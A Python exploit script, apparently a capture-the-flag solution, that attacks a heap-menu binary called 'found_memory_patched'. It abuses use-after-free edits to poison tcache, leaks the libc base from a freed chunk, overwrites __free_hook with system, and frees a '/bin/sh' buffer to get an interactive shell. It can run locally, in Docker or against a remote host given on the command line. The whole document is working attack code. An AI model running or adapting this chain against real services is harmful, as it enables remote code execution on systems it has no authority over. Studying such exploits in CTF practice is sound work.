#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from pwnie import *
from subprocess import check_output
from time import sleep

# context.log_level = 'debug'
context.terminal = ["wt.exe", "-w", "0", "split-pane", "--size", "0.65", "-d", ".", "wsl.exe", "-d", "Ubuntu-22.04", "--", "bash", "-c"]
exe = context.binary = ELF('./found_memory_patched', checksec=False)
libc = exe.libc

gdbscript = '''
init-pwndbg
# init-gef-bata
brva 0x16EB
brva 0x15BC
brva 0x1495
brva 0x1647
c
'''

def start(argv=[]):
    if args.REMOTE:
        return remote(sys.argv[1], sys.argv[2])
    elif args.DOCKER:
        p = remote("localhost", 5000)
        sleep(0.5)
        pid = int(check_output(["pidof", "-s", "/app/run"]))
        gdb.attach(int(pid), gdbscript=gdbscript+f"\n set sysroot /proc/{pid}/root\nfile /proc/{pid}/exe", exe=exe.path)
        pause()
        return p
    else:
        return process([exe.path] + argv)

def choice(option: int):
    slna(b'> ', option)

def alloc():
    choice(1)
    ru(b'Allocated slot ')
    info(f'Allocated slot @ {rl()[:-1]}')

def free(idx):
    choice(2)
    slna(b': ', idx)

def view(idx):
    choice(3)
    slna(b': ', idx)

def edit(idx, data):
    choice(4)
    slna(b': ', idx)
    sa(b'Enter data: ', data)

# ==================== EXPLOIT ====================

while True:
    p = start()
    try:
        alloc() # 0
        alloc() # 1
        alloc() # 2

        free(1)
        free(2)

        edit(2, p8(0x90))
        alloc()
        alloc() # 2

        edit(2, p64(0) + p64(0x421))
        alloc() # 3

        free(1)
        free(3)

        edit(3, p16(0xa6b0))

        alloc() # 1
        alloc() # 3

        fake_chunk = flat(
            0, 0x21,
            0, 0,
            0, 0x21
        )

        edit(3, fake_chunk)
        free(0)

        view(0)
        libc.address = u64(rb(6).ljust(0x8, b'\0')) - 0x1ecbe0
        success('libc base @ %#x', libc.address)

        if args.GDB:
            gdb.attach(p, gdbscript=gdbscript)
            pause()

        alloc() # 0
        alloc() # 4

        free(0)
        free(4)

        edit(4, p64(libc.sym.__free_hook))

        alloc() # 0
        alloc() # 4

        edit(4, p64(libc.sym.system))
        edit(0, b'/bin/sh\0')
        free(0)

        sl(b'echo WIN')
        if b'WIN' in rl():
            success('Got shell!')
            interactive()
            break
    except:
        close()
